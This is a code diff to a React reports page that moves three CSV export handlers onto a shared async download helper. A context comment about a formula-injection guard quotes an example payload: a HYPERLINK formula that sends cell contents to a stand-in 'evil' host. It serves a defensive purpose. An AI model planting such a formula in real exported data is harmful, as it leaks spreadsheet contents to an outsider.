@@ -11,6 +11,7 @@ import { useAuthStore } from '../../stores/authStore';
 import { SPECIALIZATION_LABELS } from '../../types';
 import { useLanguageStore } from '../../stores/languageStore';
 import { apiRequest } from '../../services/api/client';
+import { downloadBlob } from '../../utils/downloadFile';
 
 // Sprint 72 P1/F4: CSV formula-injection guard. A resident name like
 // `=HYPERLINK("http://evil/?x="&A1,"click")` opens as a live formula
@@ -104,7 +105,7 @@ export function ReportsPage() {
 
   const formatSum = (n: number) => n.toLocaleString('ru-RU') + ' сум';
 
-  const handleExportDebtCSV = () => {
+  const handleExportDebtCSV = async () => {
     const headers = [
       language === 'ru' ? 'Ф.И.О.' : 'F.I.O.',
       language === 'ru' ? 'Район' : 'Tuman',
@@ -139,12 +140,11 @@ export function ReportsPage() {
     ]);
     const csvContent = [headers, ...rows].map(csvRow).join('\n');
     const blob = new Blob(['\uFEFF' + csvContent], { type: 'text/csv;charset=utf-8;' });
-    const url = window.URL.createObjectURL(blob);
-    const link = document.createElement('a');
-    link.href = url;
-    link.download = `долги_${new Date().toLocaleDateString('ru-RU')}.csv`;
-    link.click();
-    window.URL.revokeObjectURL(url);
+    // v130 — shared cross-platform helper
+    await downloadBlob(blob, {
+      filename: `долги_${new Date().toLocaleDateString('ru-RU')}.csv`,
+      language: language === 'ru' ? 'ru' : 'uz',
+    });
   };
 
   // Filter requests by period
@@ -248,7 +248,7 @@ export function ReportsPage() {
   );
 
   // Export branch report to CSV
-  const handleExportBranchCSV = (branch?: string) => {
+  const handleExportBranchCSV = async (branch?: string) => {
     const periodLabelsRu: Record<string, string> = {
       day: 'сегодня',
       week: 'неделю',
@@ -285,21 +285,17 @@ export function ReportsPage() {
     const csvContent = [headers, ...rows].map(csvRow).join('\n');
     const BOM = '\uFEFF';
     const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
-    const url = window.URL.createObjectURL(blob);
-    const link = document.createElement('a');
-    link.href = url;
     const periodLabels = language === 'ru' ? periodLabelsRu : periodLabelsUz;
     const dateStr = new Date().toLocaleDateString(language === 'ru' ? 'ru-RU' : 'uz-UZ');
     const filename = language === 'ru'
       ? `отчет_объекты_${branch || 'все'}_${periodLabels[period]}_${dateStr}.csv`
       : `hisobot_ob'ektlar_${branch || 'barchasi'}_${periodLabels[period]}_${dateStr}.csv`;
-    link.download = filename;
-    link.click();
-    window.URL.revokeObjectURL(url);
+    // v130 — shared cross-platform helper
+    await downloadBlob(blob, { filename, language: language === 'ru' ? 'ru' : 'uz' });
   };
 
   // Export to CSV
-  const handleExportCSV = () => {
+  const handleExportCSV = async () => {
     const periodLabelsRu: Record<string, string> = {
       day: 'сегодня',
       week: 'неделю',
@@ -333,17 +329,13 @@ export function ReportsPage() {
     const csvContent = [headers, ...rows].map(csvRow).join('\n');
     const BOM = '\uFEFF'; // For proper Cyrillic encoding in Excel
     const blob = new Blob([BOM + csvContent], { type: 'text/csv;charset=utf-8;' });
-    const url = window.URL.createObjectURL(blob);
-    const link = document.createElement('a');
-    link.href = url;
     const periodLabels = language === 'ru' ? periodLabelsRu : periodLabelsUz;
     const dateStr = new Date().toLocaleDateString(language === 'ru' ? 'ru-RU' : 'uz-UZ');
     const filename = language === 'ru'
       ? `отчет_за_${periodLabels[period]}_${dateStr}.csv`
       : `hisobot_${periodLabels[period]}_${dateStr}.csv`;
-    link.download = filename;
-    link.click();
-    window.URL.revokeObjectURL(url);
+    // v130 — shared cross-platform helper
+    await downloadBlob(blob, { filename, language: language === 'ru' ? 'ru' : 'uz' });
   };
 
   // Calculate stats
